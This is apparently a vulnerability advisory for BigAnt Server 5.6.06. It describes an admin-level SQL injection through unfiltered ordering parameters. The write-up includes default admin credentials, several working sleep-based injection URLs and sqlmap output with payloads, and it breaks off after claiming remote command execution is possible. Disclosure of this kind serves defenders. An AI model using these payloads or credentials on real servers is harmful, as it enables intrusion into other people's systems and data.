### BigAnt Server Admin+ Sql Injection

------

#### About BigAnt

BigAnt Office Messenger, LAN Messenger for enterprise, a corporate instant messaging solution. Big Ant includes IM Server, instant messaging, file sharing, voip, video chat and more.

#### Vulnerability Description

Due to BigAnt Server's failure to filter parameters such as account_order, dev_code, and user_count, users with administrator privileges can inject SQL into the application, which can lead to a vulnerability in remote command execution.

#### Affected Version

BigAnt Server 5.6.06

#### Vulnerability Verification Environment

Please refer to the official website for vulnerability construction: https://www.bigantsoft.com/

BigAnt Server installation package download address: https://www.bigantsoft.com/download/bigantim56.zip

#### Vulnerability Recurrence

1. First log in to BigAnt Server with the administrator account. Default account: superadmin, password: 123456;
2. After successful login, you can verify the vulnerability. The URL with SQL injection vulnerability is as follows:
```
http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?account_order=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/user/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/Group/index/clientid/4.html?dev_code=desc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?user_count=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/Grant/index/clientid/4.html?dev_code=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/report/group_msg_list/clientid/4.html?dev_code=asc;select%20sleep(5)%23
http://127.0.0.1:8000/index.php/Admin/report/online_list/clientid/4.html?account_order=asc;select%20sleep(5)%23
```

Use sqlmap to detect sql injection vulnerabilities. The results are as follows:

```
C:\Users\Administrator\Desktop\项目集合\sqlmap>python sqlmap.py -r test.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.9#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
 consent is illegal. It is the end user's responsibility to obey all applicable
local, state and federal laws. Developers assume no liability and are not respon
sible for any misuse or damage caused by this program

[*] starting @ 17:25:02 /2023-12-13/

[17:25:02] [INFO] parsing HTTP request from 'test.txt'
[17:25:03] [INFO] resuming back-end DBMS 'mysql'
[17:25:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: dev_code (GET)
    Type: boolean-based blind
    Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
    Payload: dev_code=desc,(SELECT (CASE WHEN (8728=8728) THEN 1 ELSE 8728*(SELE
CT 8728 FROM INFORMATION_SCHEMA.PLUGINS) END))

    Type: error-based
    Title: MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)
    Payload: dev_code=desc,(SELECT 1543 FROM(SELECT COUNT(*),CONCAT(0x71767a7a71
,(SELECT (ELT(1543=1543,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SC
HEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: dev_code=desc;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANA
LYSE (EXTRACTVALUE)
    Payload: dev_code=desc PROCEDURE ANALYSE(EXTRACTVALUE(5229,CONCAT(0x5c,(BENC
HMARK(5000000,MD5(0x644d686d))))),1)#
---
[17:25:04] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: ThinkPHP, Apache 2.4.46
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:25:04] [INFO] fetched data logged to text files under 'C:\Users\Administrato
r\AppData\Local\sqlmap\output\10.3.9.215'
[17:25:04] [WARNING] your sqlmap version is outdated

```

Through the SQL injection vulnerability, it is found that the current user has database administrator rights (root@localhost), and finally remote command execution can be achieved:


